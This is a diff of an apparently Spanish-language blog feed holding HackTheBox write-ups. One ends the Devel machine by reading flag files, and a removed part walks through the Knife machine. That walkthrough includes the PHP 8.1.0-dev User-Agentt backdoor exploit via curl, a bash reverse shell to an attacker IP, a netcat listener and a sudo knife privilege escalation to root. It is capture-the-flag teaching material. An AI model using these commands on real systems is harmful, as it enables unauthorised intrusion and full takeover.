+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /b/s user.txt
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;abis&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
+&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;abis&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ser.txt&quot;&lt;/span&gt;
+echo.%user:~0,10%
+455111f4a9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /b/s root.txt
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot.txt
+&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrator&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oot.txt&quot;&lt;/span&gt;
+echo.%root:~0,10%
+655befe588
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;devel&lt;/code&gt; de HackTheBox!&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/devel/09-finish.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Devel" /><summary type="html">Vamos a resolver la máquina Devel de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB Bashed</title><link href="http://localhost:4000/bashed/" rel="alternate" type="text/html" title="HTB Bashed" /><published>2022-09-28T00:00:00-05:00</published><updated>2022-09-28T00:00:00-05:00</updated><id>http://localhost:4000/bashed</id><content type="html" xml:base="http://localhost:4000/bashed/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/bashed/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -10,7 +302,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 &lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bashed&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack bashed
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack bashed 
 &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -2290,204 +2582,4 @@ Lo único que necesitamos en este momento es ubicarnos en donde queremos los dir
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Bash" /><category term="Script" /><summary type="html">Vamos a crear la función mkhack para organizar nuestros ficheros. ¡Let's hack!</summary></entry><entry><title type="html">HTB Knife</title><link href="http://localhost:4000/knife/" rel="alternate" type="text/html" title="HTB Knife" /><published>2022-04-28T00:00:00-05:00</published><updated>2022-04-28T00:00:00-05:00</updated><id>http://localhost:4000/knife</id><content type="html" xml:base="http://localhost:4000/knife/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/knife/01inicio.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;¡Hola!
-En esta ocasión vamos a resolver de la maquina &lt;strong&gt;Knife&lt;/strong&gt; de &lt;a href=&quot;https://app.hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
-La maquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
-
-&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
-
-&lt;p&gt;Para iniciar nuestra máquina, vamos a crear un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;knife
-❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;knife
-❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;nmap exploit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
-
-&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.242 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;ttl | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $4,$6}'&lt;/span&gt;
-10.10.10.242: &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTheBox).&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
-  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.242 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; openPorts | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
-22/tcp open  ssh
-80/tcp open  http
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.242 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; deepScan
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-04-17 13:38 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.242
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.090s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey:
-|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-title:  Emergent Medical Idea
-|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podemos identificar que el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/knife/03page.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Vamos a realizar un &lt;strong&gt;fuzzing&lt;/strong&gt; por medio de la generación de múltiples peticiones con diferentes terminaciones a la página web, con el fin de detectar rutas de acceso a información o explotación, sin embargo, no es posible la extracción de información que fuera de ayuda para el ejercicio (solo muestro el comando para fines educativos).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación, vamos a realizar la enumeración de software utilizado para la creación de la página web a través de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.242/
-http://10.10.10.242/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.242], PHP[8.1.0-dev], Scrip&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como se puede ver, tenemos la versión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHP 8.1.0-dev&lt;/code&gt;, la cual vamos a buscar en la base de datos de exploits por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit PHP 8.1.0-dev | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;dev
-PHP 8.1.0-dev - &lt;span class=&quot;s1&quot;&gt;'User-Agentt'&lt;/span&gt; Remote Code Execution	| php/webapps/49933.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Encontramos un exploit que genera un backdoor por medio de una modificación en las cabeceras de la petición web, todo esto por con el fin de lograr un RCE (Remote Command Excecution).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User-Agentt: zerodiumsystem ('whoami');&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACIÓN&lt;/h2&gt;
-
-&lt;p&gt;Bien, ahora que tenemos conocimiento de esta vulnerabilidad, vamo a probar en la maquina victima por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; que nos permite modificar parámetros como en este caso el &lt;strong&gt;User Agent&lt;/strong&gt; (Entramos a la carpeta exploit antes de ejecutar nuestra prueba).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
-❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agentt: zerodiumsystem ('whoami');&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1
-james
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;¡Tenemos ejecución remota de comandos! Podemos ver que el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; es un usuario de la maquina víctima.&lt;/p&gt;
-
-&lt;p&gt;Vamos a generar una reverse shell en bash para cargarla y después ejecutarla en la máquina, para esto creamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escalation.sh&lt;/code&gt; con el siguiente contenido.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;escalation.sh
-&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.12/5555 0&amp;gt;&amp;amp;1'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora que tenemos nuestra reverse shell, vamos a iniciar en nuestra maquina un servidor web con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server
-Serving HTTP on 0.0.0.0 port 8000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:8000/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de tener nuestro servidor activo, generamos una petición al servidor web victima por medio del exploit encontrado anteriormente, en esta ocasión para &lt;strong&gt;subir&lt;/strong&gt; el archivo en la maquina vulnerable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agentt: zerodiumsystem(&quot; curl http://10.10.14.12:8000/escalation.sh -o /tmp/escalation.sh &quot;);'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al tener la reverse shell solo queda ejecutarlo, sin embargo, antes de ejecutar el comando es necesario ponerse en escucha por el puerto que se indicó al momento de configurar la reverse shell, para este caso es el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5555&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 5555
-Ncat: Version 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Ncat: Listening on :::5555
-Ncat: Listening on 0.0.0.0:5555
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Finalmente ejecutamos el comando para accionar la reverse shell desde la maquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agentt: zerodiumsystem(&quot; bash /tmp/escalation.sh &quot;);'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a verlo en acción.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/knife/04intrusion.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;¡Obtenemos acceso a la maquina!&lt;/p&gt;
-
-&lt;p&gt;El primer paso luego de obtener una shell es realizar el tratamiento de la TTY, por lo que dejare el procedimiento de cómo realizarlo (Esto se hace inicialmente en la maquina a la cual tenemos acceso).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
-^Z
-&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg
-&lt;/span&gt;reset
-xterm
-&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;XTERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
-&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora que estamos dentro de la maquina con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt;, vamos a escalar privilegios para lograr ser &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, pero antes de eso vamos a leer la flag del usuario.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt 2&amp;gt;/dev/null
-./home/james/user.txt
-james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10 ./home/james/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
-&lt;/span&gt;b2bf0e7aa5
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;escalamiento&quot;&gt;ESCALAMIENTO&lt;/h2&gt;
-
-&lt;p&gt;¡Perfecto! Ahora si vamos a revisar permisos por medio del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, así podremos ver qué tipo de utilidades puede ejecutar el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; con privilegios.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;james on knife:
-    env_reset, mail_badpass,
-    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
-
-User james may run the following commands on knife:
-    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/knife
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; puede ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; sin necesidad de ingresar credenciales.&lt;/p&gt;
-
-&lt;p&gt;Por medio del recurso &lt;a href=&quot;https://gtfobins.github.io/gtfobins/knife/&quot;&gt;GTFOBins&lt;/a&gt; identificamos una vía potencial de escalamiento de privilegios, ejecutando lo siguiente.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/sh&quot;'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Procedemos a realizar la prueba en nuestra maquina vulnerada.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/sh&quot;'&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
-root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
